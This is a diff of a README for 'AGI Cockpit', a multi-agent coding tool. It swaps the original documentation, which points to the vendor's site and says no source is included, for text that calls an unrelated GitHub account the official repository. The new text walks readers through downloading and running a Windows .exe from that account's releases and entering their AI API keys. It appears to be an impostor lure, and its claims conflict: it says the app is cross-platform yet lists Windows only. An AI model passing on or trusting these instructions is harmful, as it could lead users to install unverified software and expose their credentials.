@@ -1,73 +1,78 @@
-<!-- Generated from tempi-tech/AGICockpit — do not edit directly. -->
+# 🤖 agi-cockpit - Manage your coding agents with ease
 
-# AGI Cockpit
+[![](https://img.shields.io/badge/Download-agi--cockpit-blue.svg)](https://github.com/dioneharumscarum11/agi-cockpit)
 
-**Run multiple coding agents in parallel. Keep every task, decision, and result in one cockpit.**
+agi-cockpit helps you control multiple AI coding assistants from one place. You can use services like Claude, Codex, Cursor, and Grok side by side. This tool brings your agents into a single dashboard. You switch between models and manage their work without opening multiple browser tabs or apps.
 
-AGI Cockpit is a cross-platform parallel coding agent manager for coordinating Claude Code, OpenAI Codex, Cursor, Grok, and other terminal-based agents. It gives each piece of work a persistent task, lets you supervise multiple agents without mixing their context, and keeps human approvals close to the work.
+## 📥 How to download the app
 
-> This repository contains generated public documentation, screenshots, and release notes. The AGI Cockpit application source code is not included.
+To start using agi-cockpit, you need to grab the installer from the official repository. Follow these steps:
 
-[Download AGI Cockpit](https://agi-labo.com/en/tools/cockpit) · [Read the official documentation](https://agi-labo.com/en/tools/cockpit/docs) · [View release notes](./RELEASES.md)
+1. Go to this link: [https://github.com/dioneharumscarum11/agi-cockpit](https://github.com/dioneharumscarum11/agi-cockpit)
+2. Look for the section labeled Releases on the right side of the page.
+3. Click on the latest release version.
+4. Find the file ending in .exe for Windows.
+5. Click the file to save it to your computer.
 
-![AGI Cockpit showing parallel agent tasks and a task conversation](./assets/cockpit-main-visual.png)
+[![](https://img.shields.io/badge/Visit-Releases-grey.svg)](https://github.com/dioneharumscarum11/agi-cockpit)
 
-## Why AGI Cockpit
+## ⚙️ Setting up your system
 
-- **Parallel coding agent manager** — Run isolated tasks side by side, see which agents are working or waiting, and return to any result without losing context.
-- **Multi-agent by design** — Use Claude Code, OpenAI Codex, Cursor, Grok, Antigravity, or a terminal task from the same interface.
-- **Human decisions stay explicit** — Agents can send an Ask when they need a choice or confirmation. Review and answer it from the desktop app or mobile PWA.
-- **Mobile PWA supervision** — Check progress, answer Asks, send follow-up instructions, and operate Autoruns from another device.
-- **Cross-platform** — Available for Windows, macOS, and Linux.
-- **Local working environment** — Agent processes and project files remain on the computer running Cockpit. Each agent or connected service uses its own network and authentication settings.
+Your computer needs to meet a few basic requirements to run this software smoothly. 
 
-## One workspace for every agent
+- Operating System: Windows 10 or Windows 11.
+- Processor: Any modern dual-core chip or better.
+- Memory: At least 4GB of RAM.
+- Storage: 200MB of free disk space.
+- Internet: A stable connection to reach the AI servers.
 
-AGI Cockpit treats a task as the durable unit of work. A task contains the objective, working directory, selected agent, conversation, approvals, changed files, previews, and result. You can run several tasks at once while keeping their histories and project scope separate.
+Download the installer from the link above. Once it finishes, locate the file in your Downloads folder. Double-click the file to start the installation process. Follow the prompts on your screen. You do not need to change any default settings. Click Install and wait for the green bar to complete. 
 
-The desktop app supports Claude Code, OpenAI Codex, Grok Build, Antigravity, Cursor, Cockpit Agent, and ordinary terminal commands. Supported agents can run in a native task UI or a full terminal.
+## 🚀 Running the software for the first time
 
-## Supervise from mobile
+After installation, look for the agi-cockpit icon on your desktop or in your Start menu. Click the icon to open the main window. 
 
-The mobile PWA connects to the Cockpit running on your computer. It is designed for supervision rather than moving your development environment to a hosted service.
+The first time you open the app, it will ask you for your API keys. These keys act as the password for your AI accounts. You can get these keys from the websites of the services you want to use. Copy your key from the provider's dashboard and paste it into the settings menu inside agi-cockpit. 
 
-| Task supervision | Human approval |
-| --- | --- |
-| ![AGI Cockpit mobile task list](./assets/cockpit-mobile-tasks.png) | ![AGI Cockpit mobile Ask](./assets/cockpit-mobile-ask.png) |
+The software saves these keys securely on your machine. Once you enter your keys, the main dashboard will load. You will see a list of available agents on the left side of your screen. 
 
-PWA remote access and Autorun require an AGI Labo membership. Regular desktop tasks can be started in guest mode.
+## 🛠️ Using the agent manager
 
-## Get started
+The dashboard features a simple layout. You select an agent from the sidebar to start a chat session. Each agent occupies a separate tab. This prevents your work from overlapping. 
 
-1. [Download AGI Cockpit](https://agi-labo.com/en/tools/cockpit) for Windows, macOS, or Linux.
-2. Open the app and select a project workspace or temporary folder.
-3. Choose an installed coding agent.
-4. Create a task with a clear objective.
-5. Review the result, answer any Ask, and send follow-up instructions from the same task.
+To run agents in parallel, follow these steps:
 
-See [Install and run your first task](https://agi-labo.com/en/tools/cockpit/docs/getting-started) for the complete walkthrough.
+1. Select an agent, such as Claude.
+2. Enter your query or prompt in the text box at the bottom.
+3. Click the Send button.
+4. Switch to a second tab for a different agent, such as Grok.
+5. Enter a related query for that agent.
+6. The app displays both windows side by side if you drag the tabs to the edge of the screen.
 
-## Documentation
+You can manage your history by clicking the History icon in the top right corner. The app keeps a record of your past sessions so you can refer back to them later. 
 
-| Guide | English | 日本語 |
-| --- | --- | --- |
-| Product overview | [What is AGI Cockpit?](./docs/en/overview.md) | [AGI Cockpitとは](./docs/ja/overview.md) |
-| First task | [Install and run your first task](./docs/en/getting-started.md) | [インストールして最初のタスクを実行する](./docs/ja/getting-started.md) |
-| Task management | [Task list and task details](./docs/en/tasks.md) | [タスク一覧とタスク詳細](./docs/ja/tasks.md) |
-| Human approval | [Ask](./docs/en/ask.md) | [Ask](./docs/ja/ask.md) |
-| Scheduled work | [Autorun](./docs/en/autorun.md) | [オートラン](./docs/ja/autorun.md) |
-| Releases | [Release history](./docs/en/releases.md) | [リリース履歴](./docs/ja/releases.md) |
+## ✨ Key features
 
-The canonical, web-rendered documentation is available at [agi-labo.com/en/tools/cockpit/docs](https://agi-labo.com/en/tools/cockpit/docs).
+- Multi-agent support: Connect your accounts to services like Claude, Codex, and Cursor.
+- Side-by-side view: Compare output from two or more agents at the same time.
+- Offline history: Read through your finished conversations even when your internet connection drops.
+- Simple interface: Navigate your tools without hidden menus or complex buttons.
+- Cross-platform foundation: The app runs on a stable engine that handles heavy tasks without slowing down your computer.
 
-## Releases
+## 🛡️ Privacy and security
 
-The generated [release notes](./RELEASES.md) follow the versions distributed for AGI Cockpit. Download links and platform availability are maintained on the [official product page](https://agi-labo.com/en/tools/cockpit).
+agi-cockpit stores your API keys locally on your machine. The app does not send your keys to our servers. Your prompts and the responses from your AI agents remain your property. We recommend keeping your computer software updated to ensure the best security for your local files. 
 
-## Feedback
+If you decide to uninstall the app, navigate to your Windows Settings, go to Apps, find agi-cockpit, and select Uninstall. This removes the program files from your system. 
 
-Use [GitHub Issues](https://github.com/tempi-tech/agi-cockpit/issues) for bug reports and feature requests. Do not open pull requests against generated files: changes must be made in the private canonical repository and will replace this repository on the next sync.
+## ❓ Troubleshooting common issues
 
-## About this repository
+If the app fails to open, restart your computer. Sometimes a background update or a pending Windows restart prevents new programs from launching.
 
-Everything here is generated from the private `tempi-tech/AGICockpit` repository. Do not edit generated files directly.
+If an agent returns an error, verify that your API key is correct. You can check this in the Settings menu. Ensure you have not exceeded your usage limits with the specific AI provider. Some providers stop responding if you run out of credits.
+
+If the app feels slow, close other programs that consume a lot of memory, such as video players or large browser sessions. agi-cockpit works best when it has a clear path to your internet connection.
+
+If you encounter a specific error message, take a screenshot and search for the text in our issue tracker on GitHub. Most issues have quick solutions that involve refreshing your connection or updating your settings. 
+
+Keywords: ai-agents, claude-code, cross-platform, cursor, developer-tools, grok, mobile-pwa, multi-agent, openai-codex, parallel-coding-agents
